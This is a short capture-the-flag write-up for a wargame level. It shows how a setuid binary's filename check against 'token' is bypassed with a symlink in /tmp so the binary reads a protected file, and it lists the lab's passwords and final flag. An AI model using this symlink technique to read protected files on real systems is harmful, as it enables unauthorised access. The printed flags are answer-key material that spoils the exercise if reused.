# level08

## Vulnerability: Naming rules trickery by linking

level08's password: `fiumuikeil55xe9cu4dood66h`

1. examinate existing files and permissions

```shell
ls -la
```

shows that the level08 executable belongs to flag08 group, token is flag08:flag08

2. get the executable (from an external device), decompile it using [retdec](https://github.com/avast/retdec) and examine the resulting code

```shell
scp -P 4242 level08@<host>:level08 .
retdecomp level08
```

shows that a simple input validation is required to open the file and print its content : it needs not to contain `token`

4. link a file fullfiling the input validation to the token

```shell
ln -s ~/token /tmp/exploit
```

5. pwn the flag

```shell
./level08 /tmp/exploit
```

gives flag08's password: `quif5eloekouj29ke0vouxean`

```shell
su flag08
quif5eloekouj29ke0vouxean
getflag
```

gives flag: `25749xKZ8L7DkSCwJkT9dyv6f`
